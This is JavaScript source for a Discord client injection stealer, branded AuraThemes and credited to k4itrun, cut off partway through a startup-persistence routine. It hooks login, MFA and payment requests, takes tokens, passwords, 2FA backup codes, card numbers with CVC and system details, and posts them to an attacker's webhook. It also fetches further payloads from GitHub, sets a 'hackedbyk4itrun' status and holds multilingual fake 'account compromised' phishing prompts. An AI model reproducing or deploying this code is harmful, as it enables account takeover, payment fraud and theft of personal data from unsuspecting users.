const querystring = require('querystring');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

const { exec } = require('child_process');
const { promisify } = require('util');
const { BrowserWindow, session } = require('electron');

const execCommand = async (command, options = {}) => {
  try {
    const { stdout, stderr } = await promisify(exec)(command, options);
    if (stderr) {
      console.error(stderr);
    }
    return stdout.trim();
  } catch (error) {
    return null;
  }
};

const execScript = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    try {
        const result = await windows[0].webContents.executeJavaScript(script, true);
        return result;
    } catch (error) {
        return null;
    }
};

const CONFIG = {
    webhook: '%WEBHOOK_URL%',
    API: '%API_URL%',
    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
    force_persist_startup: 'false',
    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
    auto_email_update: '%AUTO_EMAIL_UPDATE%',
    gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
    get: {
        token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
        logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`),
    },
    auth_filters: {
        urls: [
            '/users/@me',
            '/auth/login',
            '/auth/register',
            '/remote-auth/login',
            '/mfa/totp',
            '/mfa/totp/enable',
            '/mfa/sms/enable',
            '/mfa/totp/disable',
            '/mfa/sms/disable',
            '/mfa/codes-verification',
        ],
    },
    session_filters: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ],
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        ],
    },
    badges: {
        _nitro: [
            "<:DiscordBoostNitro1:1087043238654906472> ",
            "<:DiscordBoostNitro2:1087043319227494460> ",
            "<:DiscordBoostNitro3:1087043368250511512> ",
            "<:DiscordBoostNitro6:1087043493236592820> ",
            "<:DiscordBoostNitro9:1087043493236592820> ",
            "<:DiscordBoostNitro12:1162420359291732038> ",
            "<:DiscordBoostNitro15:1051453775832961034> ",
            "<:DiscordBoostNitro18:1051453778127237180> ",
            "<:DiscordBoostNitro24:1051453776889917530> ",
        ],
        _discord_emloyee: {
            value: 1,
            emoji: "<:DiscordEmloyee:1163172252989259898>",
            rare: true,
        },
        _partnered_server_owner: {
            value: 2,
            emoji: "<:PartneredServerOwner:1163172304155586570>",
            rare: true,
        },
        _hypeSquad_events: {
            value: 4,
            emoji: "<:HypeSquadEvents:1163172248140660839>",
            rare: true,
        },
        _bug_hunter_level_1: {
            value: 8,
            emoji: "<:BugHunterLevel1:1163172239970140383>",
            rare: true,
        },
        _house_bravery: {
            value: 64,
            emoji: "<:HouseBravery:1163172246492287017>",
            rare: false,
        },
        _house_brilliance: {
            value: 128,
            emoji: "<:HouseBrilliance:1163172244474822746>",
            rare: false,
        },
        _house_balance: {
            value: 256,
            emoji: "<:HouseBalance:1163172243417858128>",
            rare: false,
        },
        _early_supporter: {
            value: 512,
            emoji: "<:EarlySupporter:1163172241996005416>",
            rare: true,
        },
        _bug_hunter_level_2: {
            value: 16384,
            emoji: "<:BugHunterLevel2:1163172238942543892>",
            rare: true,
        },
        _early_bot_developer: {
            value: 131072,
            emoji: "<:EarlyBotDeveloper:1163172236807639143>",
            rare: true,
        },
        _certified_moderator: {
            value: 262144,
            emoji: "<:CertifiedModerator:1163172255489085481>",
            rare: true,
        },
        _active_developer: {
            value: 4194304,
            emoji: "<:ActiveDeveloper:1163172534443851868>",
            rare: true,
        },
        _spammer: {
            value: 1048704,
            emoji: "⌨️",
            rare: false,
        },
    },
};

const request = async (method, url, headers = {}, data = null) => {
    try {
        const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
            return new Promise((resolve, reject) => {
                const { protocol, hostname, pathname, search } = new URL(url);
                const client = protocol === 'https:' ? https : http;
                const options = {
                    hostname,
                    path: pathname + search,
                    method,
                    headers: {
                        'Access-Control-Allow-Origin': '*',
                        ...headers,
                    },
                };
                const req = client.request(options, (res) => {
                    let resData = '';
                    res.on('data', (chunk) => resData += chunk);
                    res.on('end', () => resolve(resData));
                });
                req.on('error', err => reject(err));
                if (data) req.write(data);
                req.end();
            });
        });
        return Promise.all(requests);
    } catch (err) {
        return Promise.reject(err);
    }
};

const notify = async (ctx, token, user) => {
    const getData = new GetDataUser();
    let AuritaData = await AuritaCord();

    const [profile, system ,network, billing, friends, servers] = [
       await AuritaData.profile,
       await getData.SystemInfo(),
       await getData.Network(),
       await getData.Billing(token),
       await getData.Friends(token),
       await getData.Servers(token),
    ];

    const [nitro, badges] = [
        getData.Nitro(profile),
        getData.Badges(user.flags),
    ];

    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
    ctx.username = `AuraThemes - injection`;
    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
    ctx.embeds[0].fields.unshift({
        name: `<a:hearts:1176516454540116090> Token:`,
        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
        inline: false
    })

    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    };

    ctx.embeds[0].fields.push(
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Nitro", value: nitro, inline: true },
        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Badges", value: badges, inline: true },
        { name: "Billing", value: billing, inline: true },
        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
    );

    if (friends) {
        ctx.embeds.push({ title: friends.title, description: friends.description });
    }

    if (servers) {
        ctx.embeds.push({ title: servers.title, description: servers.description });
    }

    if (CONFIG.gofile_download_link !== '%GOFILE_DOWN' + 'LOAD_LINK%') {
        ctx.embeds.push({ title: 'Gofile Download Link', description: `[Download here](${CONFIG.gofile_download_link})` });
    }

    ctx.embeds.push({
        title: `System Information`,
        fields: [
            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
        ]
    });

    ctx.embeds.forEach(embed => {
        embed.color = 12740607;
        embed.author = {
            name: `${user.username} | ${user.id}`,
            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
        };
        embed.footer = {
            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
            icon_url: "https://avatars.githubusercontent.com/u/103044629",
        };
        embed.timestamp = new Date();
    });

    try {
        await request('POST', CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(ctx));
    } catch (error) {
        console.error();
    }
};

const editSettingUser = async () => {
    try {
        let AuritaData = await AuritaCord();
        const data = {
            status: 'dnd',
            email_notifications_enabled: false,
            stream_notifications_enabled: false,
            custom_status: { 
                text: 'hackedbyk4itrun', 
                expires_at: null, 
                emoji_id: null, 
                emoji_name: null
            },
        };
        const patchData = JSON.stringify(data);
        const response = await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
            'Content-Type': 'application/json',
            'Content-Length': patchData.length,
            'Authorization': AuritaData.token
        }, patchData);

        return JSON.parse(response);
    } catch (error) {
        return {};
    }
};

const translateAutoEmailUpdate = async (lang) => {
    const languages = {
        "zh-CN": [
            "用户设置",
            "编辑电子邮件地址",
            "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
            "已经受到威胁。",
            "请更改它以继续使用您的帐户。",
            "您不再可以访问您的电子邮件地址",
            "联系您的电子邮件提供商以解决问题。",
        ],
        "zh-TW": [
            "用戶設置",
            "編輯電子郵件地址",
            "我們檢測到您的Discord帳戶有異常情況，您的地址",
            "受到威脅。",
            "請更改它以繼續使用您的帳戶。",
            "您不再能夠訪問您的電子郵件地址",
            "請聯繫您的電子郵件提供商以修復問題。",
        ],
        "en-GB": [
            "User Settings",
            "Edit email address",
            "We have detected something unusual with your Discord account, your address,",
            "has been compromised.",
            "Please change it to continue using your account.",
            "No longer have access to your email",
            "Contact your email provider to fix it.",
        ],
        "en-US": [
            "User Settings",
            "Edit email address",
            "We have detected something unusual with your Discord account, your address,",
            "has been compromised.",
            "Please change it to continue using your account.",
            "No longer have access to your email",
            "Contact your email provider to fix it.",
        ],
        "es-ES": [
            "Configuración del usuario",
            "Editar dirección de correo electrónico",
            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
            "ha sido comprometida.",
            "Por favor, cámbiala para continuar usando tu cuenta.",
            "¿Ya no tienes acceso a tu correo electrónico?",
            "Contacta a tu proveedor de correo electrónico para solucionarlo."
        ],
        "es-419": [
            "Configuración del usuario",
            "Editar dirección de correo electrónico",
            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
            "ha sido comprometida.",
            "Por favor, cámbiala para continuar usando tu cuenta.",
            "¿Ya no tienes acceso a tu correo electrónico?",
            "Contacta a tu proveedor de correo electrónico para solucionarlo."
        ],
        "pr-BR": [
            "Configurações do usuário",
            "Editar endereço de e-mail",
            "Detectamos algo incomum em sua conta Discord, seu endereço,",
            "foi comprometido.",
            "Por favor, altere-o para continuar usando sua conta.",
            "Você não tem mais acesso ao seu endereço de e-mail",
            "Contate seu provedor de e-mail para corrigi-lo.",
        ],
        "sv-SE": [
            "Användarinställningar",
            "Redigera e-postadress",
            "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
            "har komprometterats.",
            "Ändra den för att fortsätta använda ditt konto.",
            "Du har inte längre tillgång till din e-postadress",
            "Kontakta din e-postleverantör för att åtgärda det.",
        ],
        "fr": [
            "Paramètres utilisateur",
            "Modifier l\\'adresse e-mail",
            "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
            "a été compromise.",
            "Veuillez la changer pour continuer à utiliser votre compte.",
            "Vous n\\'avez plus accès à votre adresse e-mail",
            "Contactez votre fournisseur de messagerie pour la réparer.",
        ],
        "pt": [
            "Configurações do usuário",
            "Editar endereço de e-mail",
            "Detectamos algo incomum em sua conta Discord, seu endereço,",
            "foi comprometido.",
            "Por favor, altere-o para continuar usando sua conta.",
            "Você não tem mais acesso ao seu endereço de e-mail",
            "Contate seu provedor de e-mail para corrigi-lo.",
        ],
        "da": [
            "Brugerindstillinger",
            "Rediger e-mailadresse",
            "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
            "er blevet kompromitteret.",
            "Ændre den for at fortsætte med at bruge din konto.",
            "Du har ikke længere adgang til din e-mailadresse",
            "Kontakt din e-mail-udbyder for at få det rettet.",
        ],
        "de": [
            "Benutzereinstellungen",
            "E-Mail-Adresse bearbeiten",
            "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
            "wurde kompromittiert.",
            "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
            "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
            "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
        ],
        "hr": [
            "Korisničke postavke",
            "Uredi adresu e-pošte",
            "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
            "je kompromitirana.",
            "Promijenite je da biste nastavili koristiti svoj račun.",
            "Više nemate pristup svojoj e-pošti",
            "Kontaktirajte svog pružatelja e-pošte da to popravi.",
        ],
        "it": [
            "Impostazioni utente",
            "Modifica indirizzo email",
            "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
            "è stato compromesso.",
            "Per favore cambialo per continuare a usare il tuo account.",
            "Non hai più accesso alla tua email",
            "Contatta il tuo provider email per risolvere il problema.",
        ],
        "lt": [
            "Vartotojo nustatymai",
            "Redaguoti el. pašto adresą",
            "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
            "buvo pažeistas.",
            "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
            "Dabar neturite prieigos prie savo el. pašto",
            "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
        ],
        "hu": [
            "Felhasználói beállítások",
            "E-mail cím szerkesztése",
            "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
            "meg lett veszélyeztetve.",
            "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
            "Nincs többé hozzáférése az e-mail címéhez",
            "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
        ],
        "no": [
            "Brukerinnstillinger",
            "Rediger e-postadresse",
            "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
            "har blitt kompromittert.",
            "Vennligst endre den for å fortsette å bruke kontoen din.",
            "Har ikke lenger tilgang til e-posten din",
            "Ta kontakt med e-postleverandøren din for å fikse det.",
        ],
        "pl": [
            "Ustawienia użytkownika",
            "Edytuj adres e-mail",
            "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
            "został naruszony.",
            "Zmień go, aby kontynuować korzystanie z konta.",
            "Nie masz już dostępu do swojej poczty e-mail",
            "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
        ],
        "ro": [
            "Setări utilizator",
            "Editare adresă de email",
            "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
            "a fost compromisă.",
            "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
            "Nu mai ai acces la adresa ta de email",
            "Contactează furnizorul tău de email pentru a rezolva problema.",
        ],
        "fi": [
            "Käyttäjäasetukset",
            "Muokkaa sähköpostiosoitetta",
            "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
            "on vaarantunut.",
            "Vaihda se jatkaaksesi tilisi käyttöä.",
            "Sinulla ei ole enää pääsyä sähköpostiisi",
            "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
        ],
        "vi": [
            "Cài đặt người dùng",
            "Chỉnh sửa địa chỉ email",
            "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
            "đã bị đe dọa.",
            "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
            "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
            "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
        ],
        "tr": [
            "Kullanıcı Ayarları",
            "E-posta adresini düzenle",
            "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
            "tehlikeye girdi.",
            "Kullanmaya devam etmek için lütfen değiştirin.",
            "Artık e-posta adresinize erişiminiz yok",
            "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
        ],
        "cs": [
            "Uživatelské nastavení",
            "Upravit e-mailovou adresu",
            "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
            "byla narušena.",
            "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
            "Nemáte již přístup k vaší e-mailové adrese",
            "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
        ],
        "el": [
            "Ρυθμίσεις χρήστη",
            "Επεξεργασία διεύθυνσης email",
            "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
            "έχει διακινδυνευθεί.",
            "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
            "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
            "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
        ],
        "bg": [
            "Потребителски настройки",
            "Редактиране на имейл адрес",
            "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
            "е бил компрометиран.",
            "Моля, променете го, за да продължите да използвате вашия акаунт.",
            "Вече нямате достъп до вашия имейл адрес",
            "Свържете се с вашия доставчик на имейли, за да го оправите.",
        ],
        "ru": [
            "Настройки пользователя",
            "Изменить адрес электронной почты",
            "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
            "был скомпрометирован.",
            "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
            "У вас больше нет доступа к вашему адресу электронной почты",
            "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
        ],
        "uk": [
            "Налаштування користувача",
            "Редагування електронної адреси",
            "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
            "була під загрозою.",
            "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
            "Ви більше не маєте доступу до своєї електронної адреси",
            "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
        ],
        "hi": [
            "उपयोगकर्ता सेटिंग्स",
            "ईमेल पता संपादित करें",
            "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
            "संकट में है।",
            "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
            "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
            "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
        ],
        "th": [
            "การตั้งค่าผู้ใช้",
            "แก้ไขที่อยู่อีเมล",
            "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
            "ถูกขัดจังหวะ",
            "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
            "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
            "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
        ],
        "ja": [
            "ユーザー設定",
            "メールアドレスを編集",
            "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
            "危険にさらされています。",
            "アカウントを引き続き使用するために変更してください。",
            "もはやあなたのメールアドレスにアクセスできません",
            "問題を修正するためにメールプロバイダーに連絡してください。",
        ],
        "ko": [
            "사용자 설정",
            "이메일 주소 편집",
            "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
            "이 위험에 빠져 있습니다.",
            "귀하의 계정을 계속 사용하려면 변경하십시오.",
            "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
            "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
        ],
    };

    const language = languages[lang] || [
        "User Settings",
        "Edit email address",
        "We have detected something unusual with your Discord account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
    ];

    return language;
};

class Fetcher {
    constructor(token) {
        this.token = token;
    }
    _fetch = async (endpoint, headers) => {
        const APIs = [
            'https://discordapp.com/api',
            'https://discord.com/api',
            'https://canary.discord.com/api',
            'https://ptb.discord.com/api'
        ];
        const response = await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers)
        return JSON.parse(response);
    };

    User = async () => {
        return await this._fetch("@me", {
            "Authorization": this.token
        });
    };

    Profile = async () => {
        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
            "Authorization": this.token
        });
    };

    Friends = async () => {
        return await this._fetch("@me/relationships", {
            "Authorization": this.token
        });
    };

    Servers = async () => {
        return await this._fetch("@me/guilds?with_counts=true", {
            "Authorization": this.token
        });
    };

    Billing = async () => {
        return await this._fetch("@me/billing/payment-sources", {
            "Authorization": this.token
        });
    };
};

class GetDataUser {
    SystemInfo = async () => {
        try {
            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
                execCommand("wmic OS get caption, osarchitecture | more +1"),
                execCommand("wmic cpu get name | more +1"),
                execCommand("wmic PATH Win32_VideoController get name | more +1").then(stdout => stdout.replace(/\r\n|\r/g, "")),
                execCommand("wmic computersystem get totalphysicalmemory | more +1").then(stdout => `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`),
                execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"),
                execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
                execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress"),
                execCommand("powershell.exe (Get-NetIPAddress).IPAddress"),
                execCommand("echo %NUMBER_OF_PROCESSORS%")
            ]);

            return {
              os,
              cpu,
              gpu,
              ram,
              uuid,
              productKey,
              macAddress,
              localIP,
              cpuCount,
          };
        } catch (error) {
            return {};
        }
    };

    Network = async () => {
        try {
            const response = await request('GET', "http://ip-api.com/json", {
                'Content-Type': 'application/json'
            });
            return JSON.parse(response);
        } catch (error) {
            return {};
        }
    };

    Badges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || '❓';

    RareBadges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                && CONFIG.badges[badge].rare
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || '';

    Billing = async (token) => {
        const API = new Fetcher(token);
        const data = await API.Billing();

        const payment = {
            1: '💳',
            2: '<:Paypal:1129073151746252870>'
        };
        let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
        return paymentMethods || '❓';
    }

    Friends = async (token) => {
        const API = new Fetcher(token);
        const friends = await API.Friends();
        const {RareBadges} = new GetDataUser();
    
        const filteredFriends = friends
            .filter(friend => friend.type === 1)
            .map(friend => ({
                username: friend.user.username,
                flags: RareBadges(friend.user.public_flags),
            }))

        const rareFriends = filteredFriends.filter(friend => friend.flags);

        const hQFriends = rareFriends.map(friend => {
            const name = `${friend.username}`;
            return`${friend.flags} | ${name}\n`;
        });

        const hQFriendsPlain = hQFriends.join('');

        if (hQFriendsPlain.length === 0) {
            return false;
        };

        if (hQFriendsPlain.length > 4050) {
            return {
                title: `**Rare Friends (Too many to display):**\n`,
                description: "Too many friends to display.",
            };
        };

        return {
            title: `**Rare Friends (${hQFriends.length}):**\n`,
            description: `${hQFriendsPlain}`,
        };
    };

    Servers = async (token) => {
        const API = new Fetcher(token);
        const guilds = await API.Servers();

        const filteredGuilds = guilds
            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
            .filter(guild => guild.approximate_member_count >= 500)
            .map(guild => ({
                id: guild.id,
                name: guild.name,
                owner: guild.owner,
                member_count: guild.approximate_member_count
            }));

        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
            const response = await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
                'Authorization': token
            });

            const invites = JSON.parse(response);
            const invite = invites.length > 0
                ? `[Join Server](https://discord.gg/${invites[0].code})`
                : 'No Invite';

            const emoji = guild.owner
                ? `<:Owner:963333541343686696> Owner`
                : `<:Staff:1136740017822253176> Admin`;
            const members = `Members: \`${guild.member_count}\``;
            const name = `**${guild.name}** - (${guild.id})`;

            return `${emoji} | ${name} - ${members} - ${invite}\n`;
        }));

        const hQGuildsPlain = hQGuilds.join('');

        if (hQGuildsPlain.length === 0) {
            return false;
        };

        if (hQGuildsPlain.length > 4050) {
            return {
                title: `**Rare Servers (Too many to display):**\n`,
                description: "Too many servers to display.",
            };
        };

        return {
            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
            description: `${hQGuildsPlain}`,
        }
    };
    
    getDate = (current, months) => {
        return new Date(current).setMonth(current.getMonth() + months);
    };

    Nitro = (flags) => {
        const { premium_type, premium_guild_since } = flags,
            nitro = "<:DiscordNitro:587201513873473542>";
        switch (premium_type) {
            default:
                return "❓";
            case 1:
                return nitro;
            case 2:
                if (!premium_guild_since) return nitro;
                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
                    rem = 0;
                for (let i = 0; i < months.length; i++)
                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
                        rem = i;
                        break;
                    }
            return `${nitro} ${CONFIG.badges._nitro[rem]}`;
        }
    };
};

const Cruise = async (type, response, request, email, password, token, action) => {
    let API;
    let user;
    let content;
    switch (type) {
        case 'LOGIN_USER':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            if (request?.code !== undefined) {
                content.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                );
            }
            notify(content, token, user);
            break;
        case 'USERNAME_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Username", value: `\`${request.username}\``, inline: true },
                        { name: "Password", value: `\`${request.password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'EMAIL_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Email", value: `\`${email}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PASSWORD_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                        { name: "Email", value: `\`${email}\``, inline: false, },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'BACKUP_CODES':                
            API = new Fetcher(token);
            user = await API.User();

            const codes = (response.backup_codes || CONFIG.get.backup_codes())
                .filter(code => !code.consumed || response.backup_codes === undefined)
                .map(code => response.backup_codes ? `${code.code.slice(0, 4)}-${code.code.slice(4)}` : `${code}`)
                .join('\n');

            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
                        { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'CREDITCARD_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${user.email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
                    ],
                    fields: [
                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PAYPAL_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${user.email}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'INJECTED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${user.email}\``, inline: true },
                    ],
                }],
            };
            await notify(content, token, user);
            break;
        default:
    }
};

const forcePersistStartup = async () => {
    const vbsFileName = 'DiscordBetterProtector.vbs';
    const batFileName = 'setupTask.bat';

    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
